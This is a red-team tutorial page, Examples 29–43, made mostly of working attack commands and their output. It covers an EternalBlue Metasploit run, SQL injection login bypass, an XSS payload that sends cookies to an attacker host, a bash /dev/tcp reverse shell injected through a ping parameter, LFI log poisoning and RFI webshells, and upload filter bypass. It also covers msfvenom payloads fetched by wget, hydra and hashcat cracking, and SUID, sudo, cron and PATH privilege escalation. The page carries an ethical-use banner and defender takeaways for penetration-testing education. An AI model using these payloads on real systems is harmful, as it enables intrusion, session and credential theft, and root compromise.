---
title: "Intermediate"
weight: 10000002
date: 2026-05-21T00:00:00+07:00
draft: false
description: "Red team intermediate examples — exploitation, privilege escalation, and lateral movement (Examples 29–57)"
tags: ["red-team", "intermediate", "by-example"]
---

> **Ethical Use:** All examples are for authorized penetration testing, CTF competitions,
> lab environments, and defensive understanding only. Never apply these techniques against
> systems without explicit written authorization.

## Example 29: Exploiting a Vulnerable Service — Metasploit EternalBlue (MS17-010)

**What this covers:** EternalBlue exploits a critical SMB vulnerability (CVE-2017-0144) present in unpatched Windows systems. Metasploit automates the exploitation workflow from target selection through payload delivery. A successful run drops a Meterpreter shell on the target with SYSTEM privileges.

**Scenario:** Authorized internal pentest; lab Windows 7 VM at 192.0.2.50 is unpatched and reachable on port 445.

```msfconsole
# Launch Metasploit console
msfconsole -q
# => Opens Metasploit with quiet flag (no banner)

use exploit/windows/smb/ms17_010_eternalblue
# => Selects the EternalBlue exploit module

set RHOSTS 192.0.2.50
# => Sets the target host (lab Windows 7 VM)

set LHOST 192.0.2.200
# => Sets the attacker's callback IP (local lab machine)

set LPORT 4444
# => Sets the listener port for the reverse Meterpreter shell

set PAYLOAD windows/x64/meterpreter/reverse_tcp
# => Selects a 64-bit Meterpreter reverse TCP payload

run
# => Sends the exploit; triggers SMB buffer overflow on target
# => [*] Started reverse TCP handler on 192.0.2.200:4444
# => [*] Sending stage (201798 bytes) to 192.0.2.50
# => [*] Meterpreter session 1 opened (192.0.2.200:4444 -> 192.0.2.50:49158)

getuid
# => Server username: NT AUTHORITY\SYSTEM
# => Confirms we have the highest privilege level on the target
```

**Key Takeaway:** EternalBlue delivers immediate SYSTEM-level access on unpatched SMB hosts. Defenders must prioritize MS17-010 patching and block SMBv1 at the network boundary.

**Why It Matters:** EternalBlue powered WannaCry and NotPetya, two of the most destructive ransomware campaigns ever recorded. Even in 2026, organizations running legacy Windows systems without network segmentation remain exposed. Understanding the exploit's mechanism helps defenders enforce patch management, disable SMBv1 via Group Policy, and build detection rules around the characteristic SMB negotiate patterns that precede the overflow.

---

## Example 30: Manual SQL Injection — Login Bypass and UNION SELECT

**What this covers:** SQL injection occurs when user-supplied input is concatenated directly into a database query. The classic `' OR '1'='1` payload bypasses authentication by making the WHERE clause always true. UNION SELECT extends the attack to extract data from arbitrary tables.

**Scenario:** CTF web challenge; target login form at `http://192.0.2.60/login`.

```bash
# Step 1 — Test for injection point with a single quote
curl -s -X POST http://192.0.2.60/login \
  -d "username=admin'&password=test"
# => Response: "You have an error in your SQL syntax"
# => Confirms the username field is injectable (error-based)

# Step 2 — Bypass authentication entirely
curl -s -X POST http://192.0.2.60/login \
  -d "username=' OR '1'='1' --&password=irrelevant"
# => Backend query becomes: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
# => '1'='1' is always true; -- comments out the password check
# => Response: "Welcome, admin!" (authentication bypassed)

# Step 3 — Enumerate columns with ORDER BY
curl -s -X POST http://192.0.2.60/login \
  -d "username=' ORDER BY 3 --&password=x"
# => No error → table has at least 3 columns

curl -s -X POST http://192.0.2.60/login \
  -d "username=' ORDER BY 4 --&password=x"
# => Error: "Unknown column '4' in order clause" → exactly 3 columns

# Step 4 — Extract data with UNION SELECT
curl -s -X POST http://192.0.2.60/login \
  -d "username=' UNION SELECT username,password,3 FROM users --&password=x"
# => Response body contains: admin | 5f4dcc3b5aa765d61d8327deb882cf99
# => Second column is an MD5 hash; crack offline with hashcat
```

**Key Takeaway:** Even simple SQLi payloads grant full authentication bypass. Parameterized queries or prepared statements eliminate the vulnerability; input sanitization alone is insufficient.

**Why It Matters:** SQL injection consistently ranks in OWASP's Top 10 because it appears in every technology stack and can expose an entire database in minutes. The UNION SELECT technique lets attackers map and dump tables without specialized tools. Defenders should enforce prepared statements at the ORM level, deploy a WAF as a secondary control, and alert on error strings like "SQL syntax" appearing in HTTP responses.

---

## Example 31: XSS Exploitation — Stealing Session Cookies via Reflected XSS

**What this covers:** Reflected Cross-Site Scripting injects a malicious script into a server's response through a URL parameter. When a victim clicks the crafted link, the browser executes the script in the context of the vulnerable site, allowing cookie theft and session hijacking.

**Scenario:** Authorized web app pentest; target at `http://192.0.2.61/search?q=`.

```bash
# Step 1 — Confirm reflection without encoding
curl -s "http://192.0.2.61/search?q=hello"
# => <h2>Results for: hello</h2>
# => Input is reflected directly into the HTML — no encoding applied

# Step 2 — Verify JavaScript execution
# Craft a test payload (URL-encoded)
curl -s "http://192.0.2.61/search?q=<script>alert(1)</script>"
# => <h2>Results for: <script>alert(1)</script></h2>
# => Script tags pass through unescaped → XSS confirmed

# Step 3 — Set up cookie receiver (attacker's server)
# On attacker machine (192.0.2.200), start a simple listener
python3 -m http.server 8080
# => Serving HTTP on 0.0.0.0 port 8080

# Step 4 — Build the cookie-stealing payload
# Payload: document.cookie sent to attacker via Image src
PAYLOAD='<script>new Image().src="http://192.0.2.200:8080/?c="+document.cookie</script>'

# URL-encode and embed in the search parameter
python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))"
# => %3Cscript%3Enew%20Image%28%29.src%3D%22http%3A%2F%2F10...

# Step 5 — Craft and deliver the malicious link to victim
# Victim clicks: http://192.0.2.61/search?q=%3Cscript%3Enew%20Image...
# => Victim's browser executes the script
# => Attacker's HTTP server receives:
# => GET /?c=PHPSESSID=abc123def456;%20auth=eyJhbGciOi... HTTP/1.1
# => Session cookie extracted; paste into browser to hijack session
```

**Key Takeaway:** Reflected XSS turns a single malicious link into a session hijack. Output encoding of all user-controlled values at render time is the primary defense; the `HttpOnly` cookie flag prevents JavaScript from reading session tokens.

**Why It Matters:** Reflected XSS is frequently dismissed as "low severity" because it requires user interaction, but targeted phishing makes that interaction trivial. A stolen session cookie bypasses password and MFA entirely. Defenders should implement Content Security Policy headers, enforce `HttpOnly` and `Secure` flags on all session cookies, and use template engines that auto-escape output by default.

---

## Example 32: Command Injection — Exploiting OS Command Injection in a Web Parameter

**What this covers:** Command injection occurs when user input is passed to a system shell command without sanitization. By appending shell metacharacters, an attacker runs arbitrary OS commands as the web server user. This is distinct from code injection and often leads to immediate remote code execution.

**Scenario:** Authorized pentest; target web app at `http://192.0.2.62/ping` accepts an IP address and runs `ping` on the server.

```bash
# Step 1 — Observe normal behavior
curl -s "http://192.0.2.62/ping?host=127.0.0.1"
# => PING 127.0.0.1 (127.0.0.1) 56 data bytes
# => 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms
# => Normal ping output — server runs ping(8) with our input

# Step 2 — Inject semicolon to chain a second command
curl -s "http://192.0.2.62/ping?host=127.0.0.1;id"
# => PING 127.0.0.1 ... (truncated)
# => uid=33(www-data) gid=33(www-data) groups=33(www-data)
# => id command executed; confirms injection as www-data

# Step 3 — Read /etc/passwd to confirm arbitrary file access
curl -s "http://192.0.2.62/ping?host=127.0.0.1;cat%20/etc/passwd"
# => root:x:0:0:root:/root:/bin/bash
# => daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# => ... (full passwd file)

# Step 4 — Establish a reverse shell
# Start listener on attacker machine
nc -lvnp 4444
# => Listening on 0.0.0.0 4444

# Inject a bash reverse shell (URL-encoded pipe and ampersand)
curl -s "http://192.0.2.62/ping?host=127.0.0.1;bash%20-i%20>%26%20/dev/tcp/192.0.2.200/4444%200>%261"
# => Attacker's nc receives:
# => bash: no job control in this shell
# => www-data@lab-target:/var/www/html$
```

**Key Takeaway:** A single unsanitized shell metacharacter grants remote code execution. Developers must avoid calling shell functions with user input; use language-native libraries (e.g., subprocess with argument lists, not shell=True) and apply allowlists for expected input values.

**Why It Matters:** Command injection vulnerabilities are critical severity by CVSS because exploitation is trivial and impact is total. The web server process becomes a foothold for further privilege escalation. Defenders should enforce strict input validation with allowlists, use language APIs that avoid shell invocation entirely, and monitor for anomalous child processes spawned by web server users.

---

## Example 33: File Inclusion Exploitation — LFI and RFI

**What this covers:** Local File Inclusion (LFI) allows reading arbitrary files on the server by manipulating a file path parameter. Remote File Inclusion (RFI) fetches and executes a remote PHP script. LFI can escalate to RCE through log poisoning; RFI is direct code execution if `allow_url_include` is enabled.

**Scenario:** Authorized pentest; target PHP app at `http://192.0.2.63/page.php?file=`.

```bash
# Step 1 — Test LFI with a known file
curl -s "http://192.0.2.63/page.php?file=../../../../etc/passwd"
# => root:x:0:0:root:/root:/bin/bash
# => bin:x:1:1:bin:/bin:/sbin/nologin
# => Traversal successful — reading system files

# Step 2 — Read SSH private key if present
curl -s "http://192.0.2.63/page.php?file=../../../../root/.ssh/id_rsa"
# => -----BEGIN RSA PRIVATE KEY-----
# => MIIEowIBAAKCAQEA2a7...
# => Key exfiltrated; use for direct SSH login

# Step 3 — LFI log poisoning to achieve RCE
# Poison the Apache access log via User-Agent
curl -s -A '<?php system($_GET["cmd"]); ?>' http://192.0.2.63/
# => Request logged to /var/log/apache2/access.log with PHP code as User-Agent

# Include the log file to trigger code execution
curl -s "http://192.0.2.63/page.php?file=../../../../var/log/apache2/access.log&cmd=id"
# => 192.0.2.200 - - [21/May/2026] "GET / HTTP/1.1" 200 - uid=33(www-data)
# => PHP executed — log poisoning RCE achieved

# Step 4 — RFI (if allow_url_include=On)
# Host a PHP webshell on attacker machine
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
python3 -m http.server 8080 --directory /tmp &
# => Serving HTTP on 0.0.0.0 port 8080

curl -s "http://192.0.2.63/page.php?file=http://192.0.2.200:8080/shell.php&c=whoami"
# => www-data
# => Remote file fetched and executed as PHP
```

**Key Takeaway:** File inclusion vulnerabilities turn path parameters into arbitrary read and execution primitives. Defenders must validate and whitelist file path inputs, disable `allow_url_include`, and apply open_basedir restrictions in PHP configuration.

**Why It Matters:** LFI is a common finding in PHP applications because dynamic page loading is a popular pattern. Even without RFI, log poisoning and `/proc/self/environ` techniques deliver RCE. Defenders should audit all file-loading functions, enforce strict path validation with realpath canonicalization, and ensure web server logs are not world-readable by the web process.

---

## Example 34: Unrestricted File Upload — PHP Webshell via Vulnerable Upload Form

**What this covers:** Unrestricted file upload vulnerabilities allow uploading executable server-side scripts disguised as permitted file types. Bypassing client-side and server-side extension checks plants a webshell that provides persistent remote code execution as the web server user.

**Scenario:** Authorized pentest; target app at `http://192.0.2.64/upload.php` accepts image uploads.

```bash
# Step 1 — Create a minimal PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# => Creates a one-line PHP shell; ?cmd= parameter passes OS commands

# Step 2 — Attempt direct upload (may be blocked by extension filter)
curl -s -X POST http://192.0.2.64/upload.php \
  -F "file=@shell.php;type=image/jpeg"
# => Error: "Only image files are allowed"
# => Server checks extension or MIME type

# Step 3 — Bypass with double extension
cp shell.php shell.php.jpg
curl -s -X POST http://192.0.2.64/upload.php \
  -F "file=@shell.php.jpg;type=image/jpeg"
# => Success: "File uploaded to /uploads/shell.php.jpg"
# => Apache may still execute .php if .php.jpg passes the PHP handler regex

# Step 4 — Alternatively bypass with null-byte (older PHP/Apache)
# Filename: shell.php%00.jpg — server strips after null byte
curl -s -X POST http://192.0.2.64/upload.php \
  --data-binary $'--boundary\r\nContent-Disposition: form-data; name="file"; filename="shell.php\x00.jpg"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n--boundary--'
# => Uploaded as shell.php on disk (null byte truncates filename)

# Step 5 — Execute the webshell
curl -s "http://192.0.2.64/uploads/shell.php.jpg?cmd=id"
# => uid=33(www-data) gid=33(www-data) groups=33(www-data)
# => Webshell active; attacker has RCE as www-data
```

**Key Takeaway:** Extension-only validation is insufficient; attackers use double extensions, null bytes, and MIME type spoofing to bypass filters. Defenders must store uploads outside the web root, rename files to random non-executable names, and serve them through a controller that sets Content-Type explicitly.

**Why It Matters:** Unrestricted file upload is a critical vulnerability because it reliably converts a file write primitive into arbitrary code execution. Once a webshell is planted, it persists across server restarts and provides a stable backdoor. Defenders should use magic-byte validation (not just extension checks), configure the web server to not execute scripts in upload directories, and scan uploaded files with an antivirus integration.

---

## Example 35: Exploiting Default Credentials — Finding and Using admin:admin

**What this covers:** Many network devices, web applications, and services ship with well-known default credentials that administrators fail to change. Automated tools and curated wordlists make default credential discovery fast and systematic across an entire network subnet.

**Scenario:** Authorized internal pentest; target network 192.0.2.0/24 with multiple web admin panels.

```bash
# Step 1 — Identify web services with open admin panels
nmap -p 80,443,8080,8443,9090,9200 192.0.2.0/24 --open -oG web_hosts.txt
# => 192.0.2.65:80 open
# => 192.0.2.66:8080 open (title: "Jenkins")
# => 192.0.2.67:9090 open (title: "Grafana")

# Step 2 — Try default credentials against Jenkins (admin:admin)
curl -s -u admin:admin http://192.0.2.66:8080/api/json
# => {"_class":"hudson.model.Hudson","assignedLabels":[...]}
# => 200 OK — admin:admin works on Jenkins instance

# Step 3 — Use hydra to spray common defaults against HTTP form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.0.2.65 http-post-form \
  "/admin/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 4 -f
# => [80][http-post-form] host: 192.0.2.65   login: admin   password: admin123
# => -f flag stops after first success; credentials found

# Step 4 — Exploit Jenkins script console for RCE
curl -s -u admin:admin \
  "http://192.0.2.66:8080/scriptConsole" \
  -d 'script=println("id".execute().text)' \
  --data-urlencode 'json={}'
# => uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
# => Jenkins Groovy script console provides direct OS command execution
```

**Key Takeaway:** Default credentials are a trivially exploitable misconfiguration. Organizations must enforce credential rotation during provisioning and use automated scanners to detect services with known defaults before attackers do.

**Why It Matters:** Default credential abuse requires zero vulnerability research — the credentials are public knowledge published in vendor documentation. Jenkins, Grafana, Elasticsearch, and dozens of other common enterprise tools ship with weak defaults. Defenders should implement a deployment checklist requiring credential changes before any service goes live, combine with network access controls limiting admin panels to internal-only, and audit regularly with tools like DefaultCreds-Cheat-Sheet.

---

## Example 36: Password Cracking with Hashcat — NTLM Hashes

**What this covers:** NTLM hashes captured from network traffic, SAM database dumps, or LSASS memory dumps can be cracked offline with GPU-accelerated tools like hashcat. Dictionary attacks with rules are the most effective starting point before moving to brute force.

**Scenario:** Post-exploitation on a lab Windows VM; NTLM hashes recovered from a previous dump.

```bash
# hashes.txt contains NTLM hashes in format: username:RID:LM:NTLM:::
# Example entry from secretsdump output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Step 1 — Extract only NTLM portion for hashcat
cut -d: -f4 hashes.txt > ntlm_only.txt
# => 8846f7eaee8fb117ad06bdd830b7586c
# => Each line is a 32-character hex NTLM hash

# Step 2 — Run dictionary attack with rockyou wordlist
hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt
# => -m 1000 selects NTLM hash type
# => Dictionary attack begins; GPU processes ~10 billion hashes/sec on modern cards

# Step 3 — Add rules to expand coverage
hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
# => best64.rule applies 64 mutations (capitalize, add numbers, leetspeak)
# => Dramatically increases hit rate for password123, P@ssword1 variants

# Step 4 — Review cracked passwords
hashcat -m 1000 ntlm_only.txt --show
# => 8846f7eaee8fb117ad06bdd830b7586c:password
# => Hash cracked — Administrator password is "password"

# Step 5 — Brute force short passwords if dictionary fails
hashcat -m 1000 ntlm_only.txt -a 3 ?a?a?a?a?a?a?a?a
# => -a 3 is brute force mode; ?a = all printable ASCII
# => Exhausts all 8-character combinations (time-intensive)
```

**Key Takeaway:** NTLM hashes are weak by design — no salt, fast computation. Enforcing minimum 12-character passwords, using modern hashing in applications, and enabling Windows Credential Guard to protect LSASS are essential mitigations.

**Why It Matters:** Password cracking converts a captured hash into a plaintext credential usable for authentication, lateral movement, and credential reuse across other systems. Modern GPUs crack simple NTLM hashes in seconds. Defenders should enforce complex password policies, implement LAPS to randomize local administrator passwords, deploy multi-factor authentication, and monitor for LSASS access patterns using Windows Defender Credential Guard and EDR tools.

---

## Example 37: Generating a Reverse Shell with msfvenom — ELF Payload for Linux

**What this covers:** msfvenom is the Metasploit payload generator that creates standalone executable payloads in dozens of formats. An ELF reverse shell binary for Linux connects back to the attacker's listener when executed on the target, establishing a Meterpreter or raw shell session.

**Scenario:** Authorized pentest; attacker has a file upload or file write primitive on a Linux target at 192.0.2.68.

```bash
# Step 1 — Generate a staged Meterpreter ELF payload
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.0.2.200 \
  LPORT=4444 \
  -f elf \
  -o shell.elf
# => -p selects the payload (staged 64-bit Meterpreter over TCP)
# => LHOST/LPORT set attacker callback address and port
# => -f elf outputs Linux ELF binary format
# => Payload size: 250 bytes; saved as shell.elf

# Step 2 — Generate a stageless (self-contained) payload for reliability
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.0.2.200 \
  LPORT=4445 \
  -f elf \
  -o shell_stageless.elf
# => Stageless payload embeds the entire shell — no second-stage download needed
# => More reliable across restrictive firewalls; larger file size

# Step 3 — Deliver the payload to the target
# Via HTTP if web upload is available
python3 -m http.server 8080 &
# => Payload served at http://192.0.2.200:8080/shell.elf

# On target (via command injection or existing shell access):
# wget http://192.0.2.200:8080/shell.elf -O /tmp/shell.elf
# chmod +x /tmp/shell.elf

# Step 4 — Start Metasploit listener before executing payload
msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 192.0.2.200; set LPORT 4444; run"
# => Handler waits for incoming connection
# => [*] Meterpreter session 1 opened after target executes shell.elf
```

**Key Takeaway:** msfvenom separates payload generation from delivery, enabling flexible attack chains. Defenders should monitor for ELF binaries dropped to /tmp or world-writable directories, and alert on processes establishing outbound connections from unexpected parent processes.

**Why It Matters:** Custom payload generation lets attackers tailor the binary format, architecture, and encoding to evade signature-based detection. Understanding msfvenom output helps defenders build better detection signatures and understand what Meterpreter traffic looks like at the network layer. Defenders should deploy network egress filtering, use application allowlisting to prevent unknown executables from running, and monitor /tmp and /dev/shm for new executables.

---

## Example 38: Catching a Reverse Shell with Netcat — Listener Setup and Interaction

**What this covers:** Netcat is the simplest tool for catching raw reverse shell connections. It requires no framework and works whenever a target machine executes a shell one-liner that connects back on TCP. Understanding raw shell interaction is foundational before moving to more capable handlers.

**Scenario:** Authorized pentest; target Linux server at 192.0.2.69 is vulnerable to command injection; attacker controls 192.0.2.200.

```bash
# Step 1 — Start the netcat listener on attacker machine
nc -lvnp 4444
# => -l listen mode
# => -v verbose (shows connection info)
# => -n no DNS resolution (faster)
# => -p 4444 listen on port 4444
# => Listening on 0.0.0.0 4444

# Step 2 — Trigger the reverse shell on the target
# (Executed via command injection, cron, or existing partial access)
# Target runs: bash -i >& /dev/tcp/192.0.2.200/4444 0>&1
# => bash -i opens an interactive bash session
# => >& redirects stdout and stderr to the TCP socket
# => /dev/tcp is a bash built-in TCP pseudo-device
# => 0>&1 redirects stdin from the socket too

# Step 3 — Netcat receives the connection
# => connect to 192.0.2.69 from 192.0.2.69:52341
# => bash: no job control in this shell
# => www-data@lab-target:/var/www/html$

# Step 4 — Basic interaction with the raw shell
whoami
# => www-data
id
# => uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname
# => lab-target
cat /etc/os-release
# => NAME="Ubuntu"
# => VERSION="20.04.6 LTS (Focal Fossa)"

# Note: raw shell has no tab completion, no arrow keys, kills on Ctrl+C
# See Example 39 for shell stabilization
```

**Key Takeaway:** Netcat provides the simplest reverse shell catch; it runs on virtually every Linux system without additional tools. The raw shell requires stabilization (Example 39) before it becomes comfortable for extended use.

**Why It Matters:** Understanding raw reverse shell mechanics explains why defenders see outbound TCP connections from web server processes to unusual external IPs. This is the atomic primitive underneath every C2 framework. Defenders should implement egress firewall rules allowing only expected outbound ports, use network monitoring tools to alert on new outbound connections from server processes, and correlate process ancestry when investigating unexpected network activity.

---

## Example 39: Stabilizing a Shell — PTY Upgrade with python3 and stty

**What this covers:** Raw reverse shells are fragile — Ctrl+C kills them, arrow keys produce garbled escape sequences, and tab completion is absent. The standard stabilization technique upgrades the raw socket to a proper pseudoterminal (PTY) using Python's pty module, then configures the terminal dimensions.

**Scenario:** Continuing from Example 38; attacker has a raw netcat reverse shell as www-data on 192.0.2.69.

```bash
# --- On the target machine (inside the raw shell) ---

# Step 1 — Spawn a PTY using Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'
# => Forks a bash process attached to a real PTY
# => Shell prompt changes: www-data@lab-target:/var/www/html$
# => Tab completion now works; prompt renders correctly

# Step 2 — Background the shell to configure local terminal
# Press Ctrl+Z
# => [1]+  Stopped   nc -lvnp 4444
# => Returns to attacker's local terminal

# --- On the attacker machine (local terminal) ---

# Step 3 — Put local terminal into raw mode (pass keypresses through)
stty raw -echo
# => raw: disable input processing (pass all chars through)
# => -echo: don't echo typed characters locally (target handles echo)

# Step 4 — Foreground the netcat session
fg
# => Returns to the nc session; terminal is now in raw pass-through mode
# => Press Enter once to redraw the prompt

# Step 5 — Set terminal type and size on the target
export TERM=xterm-256color
# => Enables color support and proper escape sequences

# Get local terminal dimensions first (run in another local terminal)
# stty size  =>  48 189  (rows columns)

stty rows 48 columns 189
# => Sets target shell dimensions to match attacker terminal
# => Arrow keys, history, and Ctrl+C now work correctly
# => Ctrl+C sends SIGINT to target processes instead of killing netcat

# Verify the full PTY is working
ls --color=auto
# => Colorized directory listing confirms TERM and PTY are correct
```

**Key Takeaway:** Shell stabilization turns a fragile socket into a usable interactive session. The technique is essential for any extended post-exploitation work and is a standard step in every real engagement.

**Why It Matters:** Unstabilized shells cause accidental disconnection and limit what an attacker can do interactively. Understanding this workflow helps defenders recognize the characteristic PTY spawn pattern (python3 pty.spawn) in process monitoring logs. Defenders should alert on web server processes spawning python3 with pty module arguments, and monitor for background/foreground job control signals in process event logs.

---

## Example 40: Linux Privilege Escalation — SUID Binary Abuse

**What this covers:** SUID (Set User ID) binaries run with the file owner's privileges regardless of who executes them. When a SUID binary owned by root can be exploited to spawn a shell or read arbitrary files, a low-privileged user can escalate to root. GTFOBins documents exploitation patterns for hundreds of standard Unix binaries.

**Scenario:** Authorized pentest; shell as www-data on lab Linux VM 192.0.2.70; attempting local privilege escalation.

```bash
# Step 1 — Find all SUID binaries on the system
find / -perm -4000 -type f 2>/dev/null
# => -perm -4000 matches files with SUID bit set
# => 2>/dev/null suppresses permission denied errors
# => /usr/bin/find
# => /usr/bin/vim.basic
# => /usr/bin/nmap  (older versions)
# => /usr/bin/python3.8  (misconfigured installation)
# => /usr/bin/passwd
# => Cross-reference each result against GTFOBins

# Step 2 — Exploit SUID find to get a root shell
/usr/bin/find . -exec /bin/bash -p \; -quit
# => find's -exec runs the command as root (SUID)
# => -p flag preserves the elevated EUID (doesn't drop root)
# => -quit stops after first result
# => bash: uid=33(www-data) euid=0(root)

whoami
# => root
# => Full root shell obtained

# Step 3 — Exploit SUID vim to read restricted files
/usr/bin/vim.basic /etc/shadow
# => vim runs as root due to SUID; opens shadow file
# => root:$6$rounds=5000$randomsalt$hash...:18000:0:99999:7:::
# => Copy root hash; crack offline with hashcat

# Step 4 — Exploit SUID python3 to spawn a root shell
/usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
# => os.execl replaces the python process with bash
# => Inherits SUID EUID=0 due to -p flag
# => Root shell established
```

**Key Takeaway:** SUID on common utilities like find, vim, or Python is a severe misconfiguration that grants immediate root. Defenders must audit SUID binaries regularly, remove unnecessary SUID bits with `chmod -s`, and restrict which binaries legitimately require SUID.

**Why It Matters:** SUID abuse is one of the most reliable Linux privilege escalation techniques because it requires no exploit code — only knowledge of which binaries are misconfigured. GTFOBins documents over 200 such binaries. Defenders should run automated SUID audits as part of configuration management (e.g., Chef InSpec, Ansible audit roles), and compare the SUID list against a known-good baseline on each deployment.

---

## Example 41: Linux Privesc — sudo Misconfiguration (NOPASSWD for vim/less/bash)

**What this covers:** The `sudo` command grants specific users permission to run commands as root. Misconfigurations where NOPASSWD is combined with interactive binaries (vim, less, bash, python) allow a user to spawn a root shell without knowing the root password, directly from the sudoers rule.

**Scenario:** Authorized pentest; shell as `devuser` on lab Linux VM; checking sudo permissions.

```bash
# Step 1 — Check what sudo permissions the current user has
sudo -l
# => Matching Defaults entries for devuser on lab-target:
# =>     env_reset, mail_badpass
# => User devuser may run the following commands on lab-target:
# =>     (ALL : ALL) NOPASSWD: /usr/bin/vim
# =>     (ALL : ALL) NOPASSWD: /usr/bin/less
# => NOPASSWD means no password required to run these as root

# Step 2 — Escape vim to a root shell
sudo /usr/bin/vim -c ':!/bin/bash'
# => sudo runs vim as root
# => :! executes a shell command from within vim
# => /bin/bash spawns a root shell from inside vim

# Alternative vim escape method
sudo /usr/bin/vim
# => :set shell=/bin/bash
# => :shell
# => Both methods drop into root bash

# Step 3 — Escape less to a root shell
sudo /usr/bin/less /etc/passwd
# => Displays file content with less pager (running as root)
# => Type: !bash (or !/bin/bash) at the less prompt
# => bash spawns as root — less forks a shell with current privileges

# Step 4 — Verify root access
id
# => uid=0(root) gid=0(root) groups=0(root)
# => Full root — escalation complete

# Step 5 — Confirm and maintain access
cat /etc/shadow
# => root:$6$rounds=5000$...:18000:0:99999:7:::
# => Shadow file readable — extract and crack hashes for persistence
```

**Key Takeaway:** Any interactive binary in sudoers with NOPASSWD grants root trivially. The sudoers file must never grant NOPASSWD access to editors, pagers, shells, or scripting interpreters. Use targeted, non-interactive commands with argument restrictions instead.

**Why It Matters:** Overly permissive sudoers rules are a frequent finding in real engagements, often introduced by developers who want convenience during deployment. GTFOBins provides escape paths for virtually every interactive tool. Defenders should audit `/etc/sudoers` and `/etc/sudoers.d/` regularly, apply the principle of least privilege, and prefer targeted sudo rules like `NOPASSWD: /usr/bin/service nginx restart` over blanket binary access.

---

## Example 42: Linux Privesc — Cron Job with World-Writable Script Path

**What this covers:** Cron jobs running as root that call scripts in world-writable directories allow a low-privileged user to replace or modify the script. When cron executes the modified script, arbitrary commands run as root. This is a common finding in misconfigured Linux servers.

**Scenario:** Authorized pentest; shell as `lowuser` on lab Linux VM 192.0.2.72.

```bash
# Step 1 — Enumerate cron jobs for all users
cat /etc/crontab
# => SHELL=/bin/sh
# => PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# => * * * * * root /opt/scripts/backup.sh
# => Runs as root every minute; calls /opt/scripts/backup.sh

ls -la /etc/cron.d/
# => -rw-r--r-- 1 root root 52 May 21 /etc/cron.d/maintenance
cat /etc/cron.d/maintenance
# => */5 * * * * root /opt/scripts/cleanup.sh

# Step 2 — Check permissions on called scripts and their directories
ls -la /opt/scripts/
# => drwxrwxrwx 2 root root 4096 /opt/scripts/   ← World-writable directory!
# => -rwxr-xr-x 1 root root  89 backup.sh
# => -rwxr-xr-x 1 root root  62 cleanup.sh

ls -la /opt/scripts/backup.sh
# => -rwxr-xr-x 1 root root 89 — script not writable, but directory is

# Step 3 — Replace the script (directory write allows deletion + creation)
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# => Overwrites backup.sh with a payload that copies bash with SUID bit
# => Wait up to 1 minute for cron to execute

# Step 4 — Execute the SUID bash copy
ls -la /tmp/rootbash
# => -rwsr-sr-x 1 root root 1234376 May 21 /tmp/rootbash
# => SUID bit set — owned by root

/tmp/rootbash -p
# => -p flag preserves EUID (does not drop to real UID)
whoami
# => root
```

**Key Takeaway:** Cron jobs are a persistent privilege escalation surface because they run silently and repeatedly. World-writable script directories effectively grant root-level write access. Defenders should audit cron scripts and their parent directories, ensuring only root can write to paths called by root cron jobs.

**Why It Matters:** Cron-based privesc is stealthy and persistent — the attacker's code runs automatically without any user interaction after initial script modification. Defenders should implement file integrity monitoring (e.g., AIDE, Tripwire) on cron-called scripts, alert on cron job directories that are world-writable, and enforce least-privilege directory permissions as part of CIS benchmark hardening.

---

## Example 43: Linux Privesc — PATH Hijacking Attack

**What this covers:** When a SUID binary or root-owned script calls an external command using a relative name (without full path), an attacker can prepend a malicious directory to PATH containing a fake version of that command. The SUID process then executes the attacker's binary as root.

**Scenario:** Authorized pentest; shell as `lowuser` on lab Linux VM; discovered a custom SUID binary.

```bash
# Step 1 — Identify a vulnerable SUID binary that calls commands relatively
find / -perm -4000 -type f 2>/dev/null
# => /usr/local/bin/sysinfo  (custom, non-standard — interesting)

# Step 2 — Examine what commands it calls (strings analysis)
strings /usr/local/bin/sysinfo
# => /lib64/ld-linux-x86-64.so.2
# => libc.so.6
# => setuid
# => service apache2 status   ← Calls "service" without full path!
# => df -h
# => ps aux
# => Relative call to "service" — vulnerable to PATH hijacking

# Step 3 — Create a malicious "service" binary in /tmp
cat > /tmp/service << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
# => Fake "service" script: copies bash with SUID bit when executed

chmod +x /tmp/service
# => Make the fake service executable

# Step 4 — Prepend /tmp to PATH and run the SUID binary
export PATH=/tmp:$PATH
# => Shell now searches /tmp before /usr/bin, /bin, etc.

/usr/local/bin/sysinfo
# => SUID binary runs as root
# => Calls "service" — finds /tmp/service first due to PATH manipulation
# => /tmp/service executes as root → copies bash with SUID

# Step 5 — Use the planted SUID bash
/tmp/rootbash -p
# => bash: uid=1001(lowuser) euid=0(root)
whoami
# => root
```

**Key Takeaway:** Relative command calls in SUID binaries are a reliable privilege escalation vector. Developers writing privileged code must use absolute paths for every external command, and security reviews should flag relative exec calls in any elevated-privilege binary.

